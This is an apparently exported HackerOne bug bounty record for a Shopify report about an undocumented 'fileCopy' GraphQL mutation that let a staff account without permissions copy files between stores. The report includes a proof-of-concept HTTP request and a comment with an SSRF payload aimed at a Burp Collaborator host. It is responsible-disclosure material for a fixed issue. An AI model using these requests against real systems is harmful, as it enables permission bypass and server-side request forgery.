{"id":981472,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODE0NzI=","url":"https://hackerone.com/reports/981472","title":"Undocumented `fileCopy` GraphQL API","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-09-14T05:56:11.161Z","submitted_at":"2020-09-14T05:56:11.272Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ash_nz","url":"/ash_nz","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/QkvsUwLu3hoeUg5dKxPjdSei/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-10-22T18:43:38.511Z","bug_reporter_agreed_on_going_public_at":"2020-10-22T18:43:38.378Z","team_member_agreed_on_going_public_at":"2020-10-22T17:54:47.463Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Impact\nA malicious staff account with no permissions can copy other store file assets to current store, which they have no access to.\n\n## Details\nSo the story as follow \nA malicious staff member (jack_mccracken) on storeA.myshopify.com wants to upload a file on the store but could not, due to permissions restrictions. So jack_mccracken decided to find a way to bypass the restriction so he created a new store called `storeB.myshopify.com` and uploaded a file on storeB.\n\njack_mccracken is a skilled attacker he found an undocumented GraphQL API called `fileCopy`, he used this API to try to copy a file from his store `StorB`  to `StoreA` (where he is a staff member). \n\nHe login into StoreA (as staff member) and send the following request:\n\n```http\nPOST /admin/internal/web/graphql/core HTTP/1.1\nCookie: [REDACTED]\naccept: application/json\nX-CSRF-Token: [REDACTED]\nContent-Type: application/json\nUser-Agent: PostmanRuntime/7.26.5\nPostman-Token: a02c5039-29f0-4280-9084-cfe12703ff60\nHost: storeA.myshopify.com\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Length: 485\n\n{\"query\":\"\\r\\nmutation fileCopy ($key:String!,$absoluteKey:String!,$path:String!){fileCopy (key:$key,path:$path,absoluteKey:$absoluteKey) {\\r\\nfile{\\r\\n    \\r\\n    path\\r\\n}\\r\\n userErrors {\\r\\n    field\\r\\n    message\\r\\n}\\r\\n    }\\r\\n}\",\"variables\":{\n                        \"absoluteKey\": \"s/files/1/d/0864/0471/6006/6199/files/1.jpg\",\n                        \"key\": \"files/1.jpg\",\n                        \"path\": \"https://cdn.shopify.com/s/files/1/0471/6006/6199/files/1.jpg?6\"\n}\n}\n```\n\nthe variables `absoluteKey` `key` and `path`values  are the values of the file he uploaded in his store `storeB`\n\nTHE END\n\n## Impact\n\nA malicious staff account with no permissions can copy other store file assets to current store, which they have no access to.","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":139,"voters":["xdms","whitewhale-dmb","th3hidd3nmist","xploiterr","battle_angel","drsniper","prophet","bibekshah","fattselimi","1337fenrir","and 129 more..."],"severity":{"rating":"medium","score":4.2,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9220269,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @ash_nz,\nThank you for your report! We have reproduced this issue and our engineering team is working on a fix.","automated_response":false,"created_at":"2020-09-14T19:54:57.822Z","updated_at":"2020-09-14T19:54:57.822Z","actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9221411,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"found that an attacker can do an SSRF request using this API. For this to work you need to set the values for `absoluteKey` and `key` to an image extension e.g. jpg the following is a sample request.\n\n```json\n{\"query\":\"\\r\\nmutation fileCopy ($key:String!,$absoluteKey:String!,$path:String!){fileCopy (key:$key,path:$path,absoluteKey:$absoluteKey) {\\r\\nfile{\\r\\n    \\r\\n    path\\r\\n}\\r\\n userErrors {\\r\\n    field\\r\\n    message\\r\\n}\\r\\n    }\\r\\n}\",\"variables\":{\n                      \"absoluteKey\": \"1.jpg\",\n                        \"key\": \"1.jpg\",\n                        \"path\": \"http://zdgrdgk8zi7sssw4axdoevuyup0poe.burpcollaborator.net/1.png\"\n}\n}\n``` \n","automated_response":false,"created_at":"2020-09-15T00:03:51.265Z","updated_at":"2020-09-15T00:03:51.265Z","actor":{"username":"ash_nz","cleared":false,"url":"/ash_nz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QkvsUwLu3hoeUg5dKxPjdSei/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9257257,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-09-18T14:39:25.494Z","updated_at":"2020-09-18T14:39:25.494Z","additional_data":{"old_severity":"Medium (6.3)","new_severity":"Medium (4.2)","old_severity_id":845228,"new_severity_id":849837},"actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9257285,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @ash_nz,\n\nThank you again for the report. We’re awarding a $2000 bounty for this issue under the “Core - Circumvention of User Permission Model” category. This falls towards the middle of the range for this category because an attacker could both upload new files to the /admin/settings/files section, and use overwrite a limited number of types of pre-existing files on the store. We look forward to hearing from you again soon!","automated_response":false,"created_at":"2020-09-18T14:41:30.570Z","updated_at":"2020-09-18T14:41:30.570Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"ash_nz","url":"/ash_nz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9261767,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update and the bounty :)","automated_response":false,"created_at":"2020-09-18T21:05:11.449Z","updated_at":"2020-09-18T21:05:11.449Z","actor":{"username":"ash_nz","cleared":false,"url":"/ash_nz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QkvsUwLu3hoeUg5dKxPjdSei/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9542243,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @ash_nz!\nThanks again for your report! We have deployed a fix for this issue, and you should no longer be able to reproduce this behaviour.\nThank you for continuing to hack on Shopify, and we hope to hear from you again soon!","automated_response":false,"created_at":"2020-10-16T13:30:52.003Z","updated_at":"2020-10-16T13:30:52.003Z","actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"ash_nz","url":"/ash_nz"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9605592,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-10-22T17:54:47.493Z","updated_at":"2020-10-22T17:54:47.493Z","first_to_agree":true,"actor":{"username":"alex_richter","cleared":false,"url":"/alex_richter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9605910,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"could you please redact sensitive information such as email. Thanks","automated_response":false,"created_at":"2020-10-22T18:43:38.401Z","updated_at":"2020-10-22T18:43:38.401Z","actor":{"username":"ash_nz","cleared":false,"url":"/ash_nz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QkvsUwLu3hoeUg5dKxPjdSei/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9605911,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-10-22T18:43:38.540Z","updated_at":"2020-10-22T18:43:38.540Z","actor":{"username":"ash_nz","cleared":false,"url":"/ash_nz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QkvsUwLu3hoeUg5dKxPjdSei/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}